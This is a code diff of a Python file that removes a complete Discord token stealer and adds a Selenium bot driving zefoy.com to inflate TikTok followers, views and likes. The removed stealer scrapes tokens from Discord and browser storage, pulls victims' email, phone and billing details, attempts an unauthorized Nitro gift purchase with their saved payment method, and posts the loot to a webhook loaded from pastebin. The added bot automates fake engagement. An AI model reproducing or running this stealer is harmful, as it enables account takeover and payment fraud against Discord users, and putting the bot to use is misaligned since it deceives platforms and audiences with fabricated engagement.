@@ -1,178 +1,321 @@
+#github.com/Kenokey
+
+#Discordlink
+#https://discord.gg/DnwnCrvZv8
+#DONT CHANGE ANY CODE
+
+from undetected_chromedriver import Chrome, ChromeOptions
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from colorama import Fore
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.remote.webelement import WebElement
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.common.exceptions import TimeoutException
+from webdriver_manager.chrome import ChromeDriverManager
 import os
-for _ in range(2):
-    try:
-        import requests, json, re
-    except:
-        os.system("pip install requests >null")
+import time
 
-class Stealer():
-    def __init__(self, webhook):
-        self.hook = webhook
-        self.tokens = []
 
-    def GetTokens(self):
-        LOCAL = os.getenv("LOCALAPPDATA")
-        ROAMING = os.getenv("APPDATA")
-        PATHS = {
-            "Discord"               : ROAMING + "\\Discord",
-            "Discord Canary"        : ROAMING + "\\discordcanary",
-            "Discord PTB"           : ROAMING + "\\discordptb",
-            "Google Chrome"         : LOCAL + "\\Google\\Chrome\\User Data\\Default",
-            "Opera"                 : ROAMING + "\\Opera Software\\Opera Stable",
-            "Brave"                 : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-            "Yandex"                : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default",
-            'Lightcord'             : ROAMING + "\\Lightcord",
-            'Opera GX'              : ROAMING + "\\Opera Software\\Opera GX Stable",
-            'Amigo'                 : LOCAL + "\\Amigo\\User Data",
-            'Torch'                 : LOCAL + "\\Torch\\User Data",
-            'Kometa'                : LOCAL + "\\Kometa\\User Data",
-            'Orbitum'               : LOCAL + "\\Orbitum\\User Data",
-            'CentBrowser'           : LOCAL + "\\CentBrowser\\User Data",
-            '7Star'                 : LOCAL + "\\7Star\\7Star\\User Data",
-            'Sputnik'               : LOCAL + "\\Sputnik\\Sputnik\\User Data",
-            'Vivaldi'               : LOCAL + "\\Vivaldi\\User Data\\Default",
-            'Chrome SxS'            : LOCAL + "\\Google\\Chrome SxS\\User Data",
-            'Epic Privacy Browser'  : LOCAL + "\\Epic Privacy Browser\\User Data",
-            'Microsoft Edge'        : LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
-            'Uran'                  : LOCAL + "\\uCozMedia\\Uran\\User Data\\Default",
-            'Iridium'               : LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveld",
-            'Firefox'               : ROAMING + "\\Mozilla\\Firefox\\Profiles",
-        }
-        
-        for platform, path in PATHS.items():
-            path += "\\Local Storage\\leveldb"
-            if os.path.exists(path):
-                for file_name in os.listdir(path):
-                    if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
-                        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                                for token in re.findall(regex, line):
-                                    if token + " | " + platform not in self.tokens:
-                                        self.tokens.append(token + " | " + platform)
+class Main:
+    def __init__(self):
+        self.options = ChromeOptions()
+        self.driver = Chrome(executable_path=ChromeDriverManager().install(), options=self.options)
 
-    def getuserinfo(self, token):
+
+
+        self.xpaths = [
+            "/html/body/div[6]/div/div[2]/div/div/div[2]/div/button", #followers
+            "/html/body/div[6]/div/div[2]/div/div/div[3]/div/button", #hearts
+            "/html/body/div[6]/div/div[2]/div/div/div[4]/div/button", #comment_hearts
+            "/html/body/div[6]/div/div[2]/div/div/div[5]/div/button", #views
+            "/html/body/div[6]/div/div[2]/div/div/div[6]/div/button", #shares
+            "/html/body/div[6]/div/div[2]/div/div/div[7]/div/button", #favorites
+            "/html/body/div[6]/div/div[2]/div/div/div[8]/div/button"  #livestream
+        ]
+        self.xpathsWithAd = [
+            "/html/body/div[6]/div/div[2]/div/div/div[2]/div/button", #followers
+            "/html/body/div[6]/div/div[2]/div/div/div[3]/div/button", #hearts
+            "/html/body/div[6]/div/div[2]/div/div/div[4]/div/button", #comment_hearts
+            "/html/body/div[6]/div/div[2]/div/div/div[6]/div/button", #views
+            "/html/body/div[6]/div/div[2]/div/div/div[7]/div/button", #shares
+            "/html/body/div[6]/div/div[2]/div/div/div[8]/div/button", #favorites
+            "/html/body/div[6]/div/div[2]/div/div/div[9]/div/button"  #livestream
+        ]
+        self.enter_video_url = [
+            "/html/body/div[7]/div/form/div/input", #followers
+            "/html/body/div[8]/div/form/div/input", #hearts
+            "/html/body/div[9]/div/form/div/input", #comment_hearts
+            "/html/body/div[10]/div/form/div/input", #views
+            "/html/body/div[11]/div/form/div/input", #shares
+            "/html/body/div[12]/div/form/div/input", #favorites
+            "/html/body/div[13]/div/form/div/input"  #livestream
+        ]
+        self.timer_text = [
+            "/html/body/div[7]/div/div/span", #followers
+            "/html/body/div[8]/div/div/span", #hearts
+            "/html/body/div[9]/div/div/span", #comment_hearts
+            "/html/body/div[10]/div/div/span", #views
+            "/html/body/div[11]/div/div/span", #shares
+            "/html/body/div[12]/div/div/span", #favorites
+            "/html/body/div[13]/div/div/span"  #livestream
+        ]
+        self.search_button = [
+            "/html/body/div[7]/div/form/div/div/button", #followers
+            "/html/body/div[8]/div/form/div/div/button", #hearts
+            "/html/body/div[9]/div/form/div/div/button", #comment_hearts
+            "/html/body/div[10]/div/form/div/div/button", #views
+            "/html/body/div[11]/div/form/div/div/button", #shares
+            "/html/body/div[12]/div/form/div/div/button", #favorites
+            "/html/body/div[13]/div/form/div/div/button"  #livestream
+        ]
+        self.send_button = [
+            "/html/body/div[7]/div/div/div[1]/div/form/button", #followers
+            "/html/body/div[8]/div/div/div[1]/div/form/button", #hearts
+            "/html/body/div[9]/div/div/div[1]/div/form/button", #comment_hearts
+            "/html/body/div[10]/div/div/div[1]/div/form/button", #views
+            "/html/body/div[11]/div/div/div[1]/div/form/button", #shares
+            "/html/body/div[12]/div/div/div[1]/div/form/button", #favorites
+            "/html/body/div[13]/div/div/div[1]/div/form/button"  #livestream
+        ]
+        self.xpathnames = [
+            "Followers", #followers
+            "Hearts", #hearts
+            "Comment Hearts", #comment_hearts
+            "Views", #views
+            "Shares", #shares
+            "Favorites", #favorites
+            "Livestream"  #livestream
+        ]
+        self.discord = "https://discord.gg/DnwnCrvZv8"
+        self.option = 0
+
+
+    def clear_console(self):
+        os.system("cls")
+
+
+
+    def wait_for_page_to_load(self):
+        self.check_if_website_loaded('ua-check', "[+] Page is Ready!", "[-] 001 Error - Cant connect to web service", 10)
+
+    def wait_for_captcha_solve(self):
+        print("[~] Waiting For CAPTCHA to solve")
+        self.check_if_website_loaded('row', "[+] CAPTCHA solved successfully!\n", "[-] 002 Error - CAPTCHA took too long OR no webservice detected", 100)
+
+
+
+    def check_if_button_is_enabled(self, button): 
+        if button.is_enabled():
+            return True
+        else:
+            return False
+
+
+
+    def check_button_status(self, xpath):
         try:
-            return requests.get("https://discordapp.com/api/v9/users/@me", headers={"content-type": "application/json", "authorization": token}).json()
-        except:return None
-    
-    def buy_nitro(self, token):
-        try:
-            r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
-            if r.status_code == 200:
-                payment_source_id = r.json()[0]['id']
-                if '"invalid": ture' in r.text:
-                    r = requests.post(f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', headers={'Authorization': token}, json={'expected_amount': 1,'gift': True,'payment_source_id': payment_source_id})   
-                    return r.json()['gift_code']
-        except:return "None"
-    
-    def RareFriend(self, token):
-        friends = ""
-        try:
-            req = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"content-type": "application/json", "authorization": token}).json()
+            element = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.XPATH, xpath)))
+            if element.is_enabled():
+                return f"{Fore.GREEN}[ONLINE]{Fore.RESET}"
+            else:
+                return f"{Fore.RED}[OFFLINE]{Fore.RESET}"
             
-            for user in req:
-                badge = ""
-                if user["user"]["public_flags"] == 1:badge = "Staff"
-                elif user["user"]["public_flags"] == 2:badge = "Partner"
-                elif user["user"]["public_flags"] == 4:badge = "Hypesquad Events"
-                elif user["user"]["public_flags"] == 8:badge = "BugHunter 1"
-                elif user["user"]["public_flags"] == 512:badge = "Early"
-                elif user["user"]["public_flags"] == 16384:badge = "BugHunter 2"
-                elif user["user"]["public_flags"] == 131072:badge = "Developer"
-                else:badge = ""
-                
-                if badge != "":friends += badge + " | " + user['id'] + "\n"            
-            if friends == "":friends += "No Rare Friends"            
-            return friends
-        except:return "None, Except Error"
-    
-    def main(self):
-        embeds = []
-        for token_line in self.tokens:
+        except TimeoutException:
             try:
-                token = token_line.split(" | ")[0]
-                plateform = token_line.split(" | ")[1]
-                languages = {'da':'Danish, Denmark','de':'German, Germany','en-GB':'English, United Kingdom','en-US':'English, United States','es-ES':'Spanish, Spain','fr':'French, France','hr':'Croatian, Croatia','lt':'Lithuanian, Lithuania','hu':'Hungarian, Hungary','nl':'Dutch, Netherlands','no':'Norwegian, Norway','pl':'Polish, Poland','pt-BR':'Portuguese, Brazilian, Brazil','ro':'Romanian, Romania','fi':'Finnish, Finland','sv-SE':'Swedish, Sweden','vi':'Vietnamese, Vietnam','tr':'Turkish, Turkey','cs':'Czech, Czechia, Czech Republic','el':'Greek, Greece','bg':'Bulgarian, Bulgaria','ru':'Russian, Russia','uk':'Ukranian, Ukraine','th':'Thai, Thailand','zh-CN':'Chinese, China','ja':'Japanese','zh-TW':'Chinese, Taiwan','ko':'Korean, Korea'}
-                get_infos = self.getuserinfo(token)
-                username = get_infos["username"] + "#" + get_infos["discriminator"]
-                user_id = get_infos["id"]
-                user_avatar = get_infos["avatar"]
-                try:user_banner = get_infos["banner"]
-                except:user_banner = None
-                email = get_infos["email"] or "❌"
-                phone = get_infos["phone"] or "❌"
-                local = languages.get(get_infos["locale"])
-                bio = get_infos["bio"] or "❌"
-                mmfa = get_infos["mfa_enabled"]
-                bbilling = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers={"content-type": "application/json", "authorization": token}).text)) > 0)
-                if bbilling == True:billing = "✔️"
-                else:billing = "❌"                
-                if mmfa == True:mfa = "✔️"
-                else:mfa = "❌"
-                badges = ""
-                flags = get_infos['flags']
-                if (flags == 1):badges += "Staff, "
-                if (flags == 2):badges += "Partner, "
-                if (flags == 4):badges += "Hypesquad Event, "
-                if (flags == 8):badges += "Green Bughunter, "
-                if (flags == 64):badges += "Hypesquad Bravery, "
-                if (flags == 128):badges += "HypeSquad Brillance, "
-                if (flags == 256):badges += "HypeSquad Balance, "
-                if (flags == 512):badges += "Early Supporter, "
-                if (flags == 16384):badges += "Gold BugHunter, "
-                if (flags == 131072):badges += "Verified Bot Developer, "
-                if (badges == ""):badges = "❌"                
-                try:
-                    if get_infos["premium_type"] == "1" or get_infos["premium_type"] == 1:nitro_type = "✔️ Nitro Classic"
-                    elif get_infos["premium_type"] == "2" or get_infos["premium_type"] == 2:nitro_type = "✔️ Nitro Boost"
-                    else:nitro_type = "❌ No Nitro"
-                except:nitro_type = "❌ No Nitro"
-                nnitro_buyed = self.buy_nitro(token)
-                if nnitro_buyed == None:nitro_buyed = "❌"
-                else:nitro_buyed = "✔️ discord.gift/" + nnitro_buyed            
-                embed = {
-                    "color": 0x7289da,
-                    "fields": [
-                        {
-                            "name": "**__User Infos:__**",
-                            "value": f"- __Username:__ `{username}`\n- __User ID:__ `{user_id}`\n- __Email:__ `{email}`\n- __Phone:__ `{phone}`\n- __Nitro Type:__ `{nitro_type}`\n- __Local:__ `{local}`\n- __Badges:__ `{badges}`\n- __Billing:__ `{billing}`\n- __A2F Enable:__ `{mfa}`"
-                        },
-                        {
-                            "name": "__**About:**__",
-                            "value": f"```{bio}```"
-                        },
-                        {
-                            "name": "__**Token:**__",
-                            "value": f"Plateform: **{plateform}**\n```\n{token}\n```"
-                        },
-                        {
-                            "name": "__**Nitro Buy:**__",
-                            "value": f"`{nitro_buyed}`"
-                        },
-                        {
-                            "name": "__**Rare Friends:**__",
-                            "value": f"```{self.RareFriend(token)}```"
-                        }
-                    ],
-                    "author": {
-                        "name": f"{username} ({user_id})",
-                        "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
-                    },
-                    "footer": {
-                        "text": f"Stealer Builder by KanekiWeb  -  kanekiweb.tk",
-                        "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
-                    },
-                    "image": {
-                        "url": f"https://cdn.discordapp.com/banners/{user_id}/{user_banner}?size=1024"
-                    },
-                    "thumbnail": {
-                        "url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}?size=1024"
-                    }
-                }
-                embeds.append(embed)                
-            except:pass        
-        requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": "","embeds": embeds,"username": "Stealer Builder","avatar_url": "https://cdn.discordapp.com/avatars/922450497074495539/a_c1738e5280f6e70487ef02d307c62a07?size=1024"}).encode())
+                self.xpaths = self.xpathsWithAd
+                xpath = self.xpaths[3]
+                element = WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.XPATH, xpath)))
+                if element.is_enabled():
+                    return f"{Fore.GREEN}[ONLINE]{Fore.RESET}"
+                else:
+                    return f"{Fore.RED}[OFFLINE]{Fore.RESET}"
+            except TimeoutException:
+                print("[-] 003 Error - Fatal error while generating list")
+                quit()
+
+          
+
+
+
+    def display_button_list(self):
+        text = "[~] Decide which bot you want [1 to 8]\n"
+        for i in range(7):
+            text = text + "[" + str(i+1) + "] " + self.xpathnames[i] + " " + self.check_button_status(self.xpaths[i]) + "\n" 
+            i+=i
+        text = text + f"[8] Discord {Fore.GREEN}[ONLINE]{Fore.RESET}"
+        print(text)
+
+
+
+    def click_button(self, number_option):
+        try:
+            xpath = self.xpaths[number_option - 1]
+            element = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.XPATH, xpath)))
+            if element.is_enabled():
+                element.click()
+            else:
+                print("[-] 004 Error - Offline OR Number not found")
+                quit()
+        except TimeoutException:
+            print("[-] 005 Error - Offline OR Number not found OR Network error")
+            quit()
+
+
+
+    def user_input_option(self):
+        self.option = int(input())
+        if self.option == 8:
+            self.driver.get(self.discord)
+        else:
+            self.click_button(self.option)
+
+ 
+
+    def check_if_website_loaded(self, path, message, error_message, delay):
+        try:
+            myElem = WebDriverWait(self.driver, delay).until(EC.presence_of_element_located((By.CLASS_NAME,path)))
+            print(message) 
+        except TimeoutException:
+            print(error_message)
+            quit()
+
+
+
+    def get_insert_tiktok_link(self):
+        print("[~] Send the Tiktok Link")
+        tiktok_link = input()
+        myElem = None
+        try:
+            myElem = WebDriverWait(self.driver, 2).until(EC.presence_of_element_located((By.XPATH, self.enter_video_url[self.option-1])))
+            print("\n[+] Loading input Field")
+        except TimeoutException:
+            print("[-] 006 Error - Cant Find Input Field")
+            quit()
+        myElem = WebDriverWait(self.driver, 2).until(EC.presence_of_element_located((By.XPATH, self.enter_video_url[self.option-1])))
+        myElem.send_keys(str(tiktok_link))
+
+        time.sleep(2)
+
+
+
+    def send(self):
+        text_box = None
+        search_button = None
+        send_button = None
         
-Grabber = Stealer(requests.get("https://pastebin.com/raw/XXXXXXX").text)
-Grabber.GetTokens()
-Grabber.main()
+        #Search Button init
+        try:
+            search_button = WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.XPATH, self.search_button[self.option-1])))
+            print("[+] Loading Search Field") 
+            time.sleep(1)
+            search_button.click()
+        except TimeoutException:
+            print("[-] 009 Error - Search not Found OR disabled")
+            quit()
+
+        time.sleep(3)
+
+
+        #Send Button init
+        try:
+            send_button = WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.XPATH, self.send_button[self.option-1])))
+            time.sleep(1)
+            send_button.click()
+            print("[+] Loading Button Field")
+            print("[+] Loaded Everything successfully!")
+            print(f"\n{Fore.WHITE}[BOT IS RUNNING NOW]{Fore.RESET}")
+            self.successfully_message()
+            self.generate_and_send(text_box, search_button, send_button)
+        except TimeoutException:
+            print("[+] Loading Text Field")
+            
+
+        time.sleep(1)
+
+        #Trying to get textbox
+        try:
+            text_box = WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.XPATH, self.timer_text[self.option-1])))
+            print("[+] Loaded Everything successfully!")
+            print(f"\n{Fore.WHITE}[BOT IS RUNNING NOW]{Fore.RESET}")
+            self.generate_and_send(text_box, search_button, send_button)
+        except TimeoutException:
+            print("[-] 008 Error - Send Key not Found")
+            quit()
+
+       
+
+
+    def generate_and_send(self, text_box, search_button, send_button):
+        delay = 900
+        
+        #Send Message
+        try:
+            while True:
+                text_box = WebDriverWait(self.driver, delay).until(EC.text_to_be_present_in_element((By.XPATH, self.timer_text[self.option-1]), "Next Submit: READY....!"))
+                time.sleep(3)
+                search_button.click()
+                send_button = WebDriverWait(self.driver, 5).until(EC.presence_of_element_located((By.XPATH, self.send_button[self.option-1])))
+                time.sleep(5)
+                send_button.click()
+                self.successfully_message()
+                text_box = None
+        except TimeoutException:
+            print("[-] 007 Error - Cant send "+(self.xpathnames[self.option+1])+" because of Connection Error or Closed Service")
+            quit()
+
+
+
+
+    def successfully_message(self):
+        print(f"{Fore.MAGENTA}[#]{Fore.WHITE} Send "+(self.xpathnames[self.option-1])+" successfully!")
+
+
+
+
+    def main(self):
+        self.clear_console()
+
+        print(Fore.GREEN + """
+         
+    ███      ▄█     ▄█   ▄█▄ ▀█████████▄   ▄██████▄      ███     
+▀█████████▄ ███    ███ ▄███▀   ███    ███ ███    ███ ▀█████████▄ 
+   ▀███▀▀██ ███▌   ███▐██▀     ███    ███ ███    ███    ▀███▀▀██ 
+    ███   ▀ ███▌  ▄█████▀     ▄███▄▄▄██▀  ███    ███     ███   ▀ 
+    ███     ███▌ ▀▀█████▄    ▀▀███▀▀▀██▄  ███    ███     ███     
+    ███     ███    ███▐██▄     ███    ██▄ ███    ███     ███     
+    ███     ███    ███ ▀███▄   ███    ███ ███    ███     ███     
+   ▄████▀   █▀     ███   ▀█▀ ▄█████████▀   ▀██████▀     ▄████▀   
+                   ▀ by @Kenokey
+        """ + Fore.RESET)
+
+        self.driver.get("https://zefoy.com/")
+
+        print("[~] Bot Loading, please wait!")
+        self.wait_for_page_to_load()
+        time.sleep(2)
+        self.wait_for_captcha_solve()
+
+
+        self.display_button_list()
+        self.user_input_option()
+     
+
+        time.sleep(1)
+        self.check_if_website_loaded('row', "[+] Started successfully!", "[-] 006 Error - Site cant Connect AND Load", 5)
+
+        self.get_insert_tiktok_link()
+        self.send()
+
+        # Weitere Schritte und Methoden hier einfügen
+
+        self.driver.quit()
+
+
+
+if __name__ == "__main__":
+    main = Main()
+    main.main()
